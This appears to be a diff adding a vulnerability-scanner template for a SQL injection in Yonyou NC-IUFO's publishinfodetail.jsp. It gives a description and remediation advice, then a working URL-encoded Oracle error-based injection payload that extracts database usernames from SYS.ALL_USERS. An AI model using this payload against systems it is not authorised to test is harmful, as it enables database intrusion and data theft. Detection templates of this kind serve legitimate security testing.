@@ -1,0 +1,39 @@
+id: yonyou_NC_IUFO-sqli-publishinfodetail
+info:
+  name: Yonyou NC-IUFO publishinfodetail.jsp SQL Injection Vulnerability
+  author:
+  - 折跃
+  description: |+
+    Yonyou NC-IUFO publishinfodetail.jsp SQL Injection Vulnerability
+    Yonyou NC-IUFO (a group reporting product) provides group enterprises with comprehensive reporting solutions and is dedicated to helping group enterprises centrally manage various reports. It mainly supports the output of various business reports, consolidated report preparation, segment report preparation, and report permission and workflow management.
+
+    A SQL injection vulnerability exists in Yonyou NC-IUFO. An attacker can exploit it to execute SQL statements to view, add, modify, or delete information in the database.
+
+  severity: high
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.yonyou.com/
+
+    Temporary remediation:
+    1. Use prepared statements. When using PDO, be careful not to concatenate variables directly into PDO statements. All queries should use the database's parameterized query interface, using parameters instead of embedding user-supplied variables directly into SQL statements. Almost all database systems provide parameterized SQL execution interfaces, which can effectively prevent SQL injection attacks.
+    2. Escape special characters entering the database (such as ', ", <, >, &, *, ;, etc.) or perform encoding conversion.
+    3. Validate the type of each data item; for example, numeric data must be numeric and the corresponding database storage field must be an int type.
+    4. Strictly limit data length, which can, to some extent, prevent longer SQL injection statements from being executed successfully.
+    5. Unify the encoding of every data layer of the website; it is recommended to use UTF-8 encoding throughout, as inconsistent encoding between layers may cause some filtering models to be bypassed.
+    6. Strictly limit the database operational privileges granted to website users, providing only the minimum privileges needed for their work, thereby minimizing the damage injection attacks can cause to the database.
+    7. Avoid displaying SQL error messages on the website, such as type errors and field mismatches, to prevent attackers from leveraging these error messages for reconnaissance.
+    8. Filter dangerous characters; for example, use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate execution if a match is found.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==500
+    - contains(body,'SYSTEM')
+  path:
+  - '{{BaseURL}}/epp/detail/publishinfodetail.jsp?pk_message=1002A31000000000BS0X%27%20AND%209561%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28104%29%7C%7CCHR%28114%29%7C%7CCHR%28113%29%7C%7C%28REPLACE%28REPLACE%28REPLACE%28REPLACE%28%28SELECT%20NVL%28CAST%28USERNAME%20AS%20VARCHAR%284000%29%29%2CCHR%2832%29%29%20FROM%20%28SELECT%20USERNAME%2CROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS%20ORDER%20BY%201%20ASC%29%20WHERE%20LIMIT%3D34%29%2CCHR%2832%29%2CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%2CCHR%2836%29%2CCHR%28113%29%7C%7CCHR%28100%29%7C%7CCHR%28113%29%29%2CCHR%2864%29%2CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2CCHR%2835%29%2CCHR%28113%29%7C%7CCHR%28117%29%7C%7CCHR%28113%29%29%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20scanf'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
